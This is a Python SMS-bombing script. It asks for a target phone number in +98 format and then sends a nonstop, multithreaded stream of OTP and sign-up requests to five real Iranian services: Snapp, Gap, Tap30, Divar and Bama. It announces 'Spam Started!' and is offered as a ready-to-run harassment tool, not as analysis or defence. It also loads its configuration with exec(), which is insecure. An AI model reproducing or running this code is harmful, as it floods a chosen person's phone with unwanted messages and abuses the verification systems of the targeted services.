#!/usr/bin/env python3

# Libraries
import os
import sys
import time
import requests
from threading import Thread

# Config
config = open("config.py", "r").read()
exec(config)

# Clear
os.system("clear")

# Logo
for char in logo:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.003) 

# Snapp
def snapp(phone):
    global SnappHeader

    SnappData = {
        "cellphone":phone
        }

    try:
        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=proxy)
        if "OK" in SnapRequest.text:
            print(f"{green}True: {white}Snapp{reset}")
        else:
            print(f"{red}False: {white}Snapp{reset}")
    except:
        pass

# Gap
def gap(phone):
    global GapHeader

    try:
        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=proxy)
        if "OK" in GapRequest.text:
            print(f"{green}True: {white}Gap{reset}")
        else:
            print(f"{red}False: {white}Gap{reset}")
    except:
        pass

# Tap30
def tap30(phone):
    global Tap30Header

    Tap30Data = {
        "credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}
        }

    try:
        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=proxy)
        if "OK" in Tap30Request.text:
            print(f"{green}True: {white}Tap30{reset}")
        else:
            print(f"{red}False: {white}Tap30{reset}")
    except:
        pass

# Divar
def divar(phone):
    global DivarHeader
        
    DivarData = {
        "phone":phone.split("+98")[1]
        }

    try:
        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=proxy)
        if "SENT" in DivarRequest.text:
            print(f"{green}True: {white}Divar{reset}")
        else:
            print(f"{red}False: {white}Divar{reset}")
    except:
        pass

# Bama
def bama(phone):
    global BamaHeader

    BamaData = "cellNumber=0"+phone.split("+98")[1]

    try:
        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=proxy)
        if "0" in BamaRequest.text:
            print(f"{green}True: {white}Bama{reset}")
        else:
            print(f"{red}False: {white}Bama{reset}")
    except:
        pass

# Main
def main():
    phone = input(f"{cyan}Enter target (+98xxxxxxxxxx) : {reset}")
    print (f"{purple}Spam Started!{reset}\n")

    while True:
        Thread(target=snapp, args=[phone]).start()   # Snapp
        time.sleep(0.5)
        Thread(target=gap, args=[phone]).start()     # Gap
        time.sleep(0.5)
        Thread(target=tap30, args=[phone]).start()   # Tap30
        time.sleep(0.5)
        Thread(target=divar, args=[phone]).start()   # Divar
        time.sleep(0.5)
        Thread(target=bama, args=[phone]).start()    # Bama
        time.sleep(0.5)        

if __name__ == "__main__":
    main()

# SlavPH
